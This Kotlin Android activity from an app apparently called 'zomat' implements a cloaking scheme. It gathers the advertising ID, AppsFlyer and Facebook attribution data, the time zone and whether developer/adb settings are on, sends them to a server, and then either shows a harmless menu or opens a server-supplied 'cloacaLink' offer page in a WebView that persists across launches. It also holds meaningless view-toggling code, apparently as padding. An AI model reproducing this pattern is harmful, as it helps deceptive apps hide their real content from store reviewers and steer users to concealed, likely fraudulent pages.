package com.application.zomat.presentation.activity

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.application.zomat.data.ApiFactory
import com.application.zomat.data.dto.AllData
import com.application.zomat.databinding.ActivityMainBinding
import com.application.zomat.presentation.MyApplication
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.*


class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private var cloacaLink: String? = null
    private var appsFlyerParams: Map<String, Any>? = null
    private var googleId: String? = null
    var appsFlyerUserId: String? = null
    private var deepLink = "null"
    private var devTmz: String? = null
    private var adb: Boolean? = null


    private val user by lazy {
        this.getSharedPreferences("hasVisited", Context.MODE_PRIVATE)
    }
    private val visited by lazy { user.getBoolean("hasVisited", true) }


    private val link by lazy {
        this.getSharedPreferences("link", Context.MODE_PRIVATE)
    }
    private val haveLink by lazy { link.getString("link", "") }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setVisibilityView()
        startWork()
    }


    private fun setVisibilityView(){
        binding.textView.visibility = View.GONE
        binding.textView3.visibility = View.GONE
        binding.textView2.visibility = View.GONE
        binding.textView.visibility = View.VISIBLE
        binding.textView3.visibility = View.VISIBLE
        binding.textView2.visibility = View.VISIBLE
        binding.textView.visibility = View.GONE
        binding.textView3.visibility = View.GONE
        binding.textView2.visibility = View.GONE
        binding.textView.visibility = View.VISIBLE
        binding.textView3.visibility = View.VISIBLE
        binding.textView2.visibility = View.VISIBLE
    }

    private fun startWork() {

        if (visited) {
            lifecycleScope.launch(Dispatchers.IO) {
                getGoogleID()
                startInitialFb()
                withContext(Dispatchers.Main) {
                    getAppsFlyerParams()
                }
            }
            user.edit().putBoolean("hasVisited", false).apply()
        } else {
            if (haveLink.isNullOrEmpty()) {
                startActivity(Intent(this, MenuActivity::class.java))
            } else {
                Intent(this, WebViewActivity::class.java).apply {
                    putExtra("link", haveLink)
                    startActivity(this)
                }
            }
        }
    }


    private fun startInitialFb() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            deepLink = it?.targetUri.toString()
        }
    }

    private fun getGoogleID() {
        googleId = AdvertisingIdClient.getAdvertisingIdInfo(this).id.toString()
        googleId?.let {
            OneSignal.setExternalUserId(it)
        }
    }


    private fun getAppsFlyerParams() {
        appsFlyerUserId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        MyApplication.liveDataAppsFlyer.observe(this) {
            if (it != null){
                appsFlyerParams = it
            }
            getSystemicData()
            setDataServer()
        }
    }

    private fun getSystemicData() {
        devTmz = TimeZone.getDefault().id
        adb = Settings.Secure.getInt(applicationContext.contentResolver,
            Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
    }


    private fun setDataServer(){
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val allData = AllData(
                    googleId = googleId, appsFlyerUserId = appsFlyerUserId ,deepLink = deepLink,
                    devTmz = devTmz, adb = adb, appsFlyerParams = appsFlyerParams
                )
                lifecycleScope.launch {
                    cloacaLink = ApiFactory.create(this@MainActivity).setDataServer(allData).offerLink
                    nextScreen()
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@MainActivity, "No Internet!", Toast.LENGTH_LONG).show()
                }
                Log.d("errorGetData", "$e")
            }
        }
    }


    private fun nextScreen() {
        if (cloacaLink == null || cloacaLink == "error") {
            startActivity(Intent(this, MenuActivity::class.java))
        } else {
            Intent(this, WebViewActivity::class.java).apply {
                link.edit().putString("link", "$cloacaLink").apply()
                putExtra("link", cloacaLink)
                startActivity(this)
            }
        }
    }
}